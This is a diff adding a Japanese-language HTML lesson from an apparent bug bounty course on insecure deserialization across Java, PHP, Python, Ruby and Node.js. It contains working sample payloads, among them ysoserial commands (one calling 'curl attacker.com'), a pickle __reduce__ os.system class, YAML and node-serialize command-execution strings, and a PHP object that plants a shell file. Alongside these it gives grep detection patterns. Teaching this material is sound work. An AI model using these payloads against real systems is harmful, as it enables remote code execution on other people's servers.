@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deserialization Attacks - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 2: Source Code Audit &gt; Deserialization Attacks
+        </div>
+
+        <div class="page-header">
+            <h1>Deserialization Attacks</h1>
+            <p class="subtitle">
+                Unsafe deserialization は RCE に直結する Critical 脆弱性。Java / PHP / Python / Ruby / Node.js の各言語における攻撃手法と Detection 方法。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>概要: なぜ Deserialization が危険なのか</h2>
+            <p>Serialization = オブジェクトをバイト列/文字列に変換。Deserialization = その逆。</p>
+            <p>問題: deserialization 時にオブジェクトのコンストラクタやマジックメソッドが<strong>自動実行</strong>される言語がある。攻撃者が serialized data を制御できれば、任意のオブジェクトを生成させ、RCE に到達できる。</p>
+
+            <div class="callout danger">
+                <div class="callout-title">OWASP A8:2017 / CWE-502</div>
+                <p>Insecure Deserialization は CVSS 9.8 (Critical) クラスの脆弱性。発見 = 即 High/Critical report。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Java: ObjectInputStream</h2>
+
+            <h3>基本的な攻撃</h3>
+<pre><code>// 危険: untrusted data を ObjectInputStream で読み込み
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // RCE!
+
+// readObject() が呼ばれた時点で、
+// オブジェクトの readObject() / readResolve() が自動実行される</code></pre>
+
+            <h3>Gadget Chains</h3>
+            <p>Classpath に存在するライブラリの既存クラスを連鎖的に悪用して RCE を達成する。</p>
+            <table>
+                <thead><tr><th>Library</th><th>Gadget Chain</th><th>Effect</th></tr></thead>
+                <tbody>
+                    <tr><td>Commons Collections</td><td>InvokerTransformer</td><td>Runtime.exec()</td></tr>
+                    <tr><td>Commons Beanutils</td><td>BeanComparator</td><td>任意メソッド呼び出し</td></tr>
+                    <tr><td>Spring Framework</td><td>MethodInvokeTypeProvider</td><td>JNDI Injection</td></tr>
+                    <tr><td>Groovy</td><td>MethodClosure</td><td>Runtime.exec()</td></tr>
+                </tbody>
+            </table>
+
+            <h3>ysoserial</h3>
+<pre><code># ysoserial: Java deserialization exploit 生成ツール
+java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
+java -jar ysoserial.jar CommonsCollections5 "curl attacker.com" > payload.bin
+
+# payload を Base64 encode して送信
+cat payload.bin | base64 | curl -X POST -H "Content-Type: application/x-java-serialized-object" \
+    --data-binary @- http://target/api/endpoint</code></pre>
+
+            <h3>Detection (grep)</h3>
+<pre><code>rg -n "ObjectInputStream|readObject\(\)|readUnshared\(\)" --type java
+rg -n "XMLDecoder|XStream" --type java
+rg -n "fromXML\(|unmarshal\(" --type java</code></pre>
+
+            <h3>Magic Bytes</h3>
+            <p>Java serialized data は <code>AC ED 00 05</code> (hex) / <code>rO0AB</code> (Base64) で始まる。HTTP response/request でこのパターンを見たら即注目。</p>
+        </div>
+
+        <div class="section">
+            <h2>PHP: unserialize()</h2>
+
+            <h3>POP Chains (Property-Oriented Programming)</h3>
+<pre><code>// PHP magic methods が deserialization 時に呼ばれる:
+// __wakeup() - unserialize() 直後
+// __destruct() - オブジェクト破棄時
+// __toString() - 文字列変換時
+
+// 危険: user input を unserialize
+$data = unserialize($_POST['data']);
+
+// Attack: __destruct で file_put_contents を呼ぶクラスを利用
+// O:8:"LogClass":1:{s:8:"filename";s:18:"/var/www/shell.php";}</code></pre>
+
+            <h3>Phar Deserialization</h3>
+<pre><code>// phar:// wrapper 経由で unserialize が trigger される
+// file_exists(), is_file() 等のファイル操作関数が trigger
+
+file_exists("phar://user_upload.phar");  // unserialize 発動!
+
+// 条件: ユーザがファイルアップロード可能 + file operation に phar path が渡せる</code></pre>
+
+            <h3>Detection (grep)</h3>
+<pre><code>rg -n "unserialize\(" --type php
+rg -n "phar://" --type php
+rg -n "__wakeup|__destruct|__toString" --type php  # gadget 候補</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Python: pickle / yaml</h2>
+
+<pre><code># pickle: __reduce__ で任意コマンド実行
+import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = pickle.dumps(Exploit())
+# このpayload を target に送り、pickle.loads() させれば RCE
+
+# yaml: !!python/object で任意クラスをインスタンス化
+# PyYAML &lt; 6.0 の yaml.load() (Loader 未指定) で発火
+payload = """
+!!python/object/apply:os.system
+- "id"
+"""</code></pre>
+
+            <h3>Detection</h3>
+<pre><code>rg -n "pickle\.(loads|load)\(|cPickle\." --type py
+rg -n "yaml\.(load|unsafe_load)\(" --type py
+rg -n "shelve\.open\(|marshal\.loads\(" --type py
+rg -n "jsonpickle\.decode\(" --type py</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">Python の安全な代替</div>
+                <p><code>pickle</code> → <code>json</code> (構造化データのみ)。<code>yaml.load</code> → <code>yaml.safe_load</code>。untrusted data の deserialization は原則不可。</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Ruby: Marshal.load</h2>
+
+<pre><code># Ruby Marshal.load は pickle 同様に危険
+data = params[:session_data]
+obj = Marshal.load(Base64.decode64(data))  # RCE!
+
+# Universal Deserialisation Gadget (ERB + method_missing chain)
+# Rails アプリでは ActiveSupport の constantize も注意
+
+# Detection:
+# Marshal.load, YAML.load (Psych &lt; 4.0), JSON.parse (type handling)</code></pre>
+
+            <h3>Detection (grep)</h3>
+<pre><code>rg -n "Marshal\.load\(|Marshal\.restore\(" --type ruby
+rg -n "YAML\.load\(" --type ruby  # YAML.safe_load との比較
+rg -n "constantize|safe_constantize" --type ruby</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Node.js: node-serialize / Prototype-based</h2>
+
+<pre><code>// node-serialize: serialize/unserialize で関数実行
+const serialize = require('node-serialize');
+const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}';
+serialize.unserialize(payload);  // RCE!
+
+// cryo: serialize で prototype chain を操作
+// funcster: 関数の serialize/deserialize
+
+// 現代の Node.js では直接的な deserialization RCE は稀
+// 代わりに Prototype Pollution 経由の gadget chain が主流</code></pre>
+
+            <h3>Detection (grep)</h3>
+<pre><code>rg -n "node-serialize|serialize\.unserialize\(" --type js
+rg -n "cryo|funcster" --type js
+rg -n "\.deserialize\(|\.unmarshal\(" --type js</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Detection Signals in Traffic</h2>
+            <table>
+                <thead><tr><th>Signal</th><th>解説</th></tr></thead>
+                <tbody>
+                    <tr><td><code>Content-Type: application/x-java-serialized-object</code></td><td>Java serialized data が送られている</td></tr>
+                    <tr><td>Base64 始まり <code>rO0AB</code></td><td>Java serialized data (AC ED 00 05)</td></tr>
+                    <tr><td>Cookie/parameter に base64 blob</td><td>任意の serialized data の可能性</td></tr>
+                    <tr><td><code>O:N:"ClassName"</code> パターン</td><td>PHP serialized object</td></tr>
+                    <tr><td><code>!!python/object</code></td><td>YAML Python object instantiation</td></tr>
+                    <tr><td>ViewState (ASP.NET)</td><td>.NET deserialization (別途専門知識必要)</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>Deserialization + untrusted input = Critical RCE</strong> — 見つけたら即 High/Critical report</li>
+                    <li><strong>Java</strong>: ObjectInputStream + classpath の gadget chain。ysoserial でペイロード生成</li>
+                    <li><strong>PHP</strong>: unserialize() + magic methods + POP chains。phar:// wrapper にも注意</li>
+                    <li><strong>Python</strong>: pickle.loads + __reduce__。yaml.load (Loader なし) も同等</li>
+                    <li><strong>Ruby</strong>: Marshal.load。Rails の YAML.load / constantize</li>
+                    <li><strong>Detection</strong>: magic bytes (rO0AB), Content-Type header, Base64 blob in cookies</li>
+                    <li>OSS whitebox audit では<strong>grep で sink 一発</strong>で見つかることが多い</li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="26-deser" onclick="toggleComplete('26-deser')">Mark Complete</button>
+        </div>
+
+        <div class="page-nav">
+            <a href="25-incomplete-fix.html">&larr; 前: Incomplete Fix</a>
+            <a href="27-dependency-confusion.html">次: Dependency Confusion &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
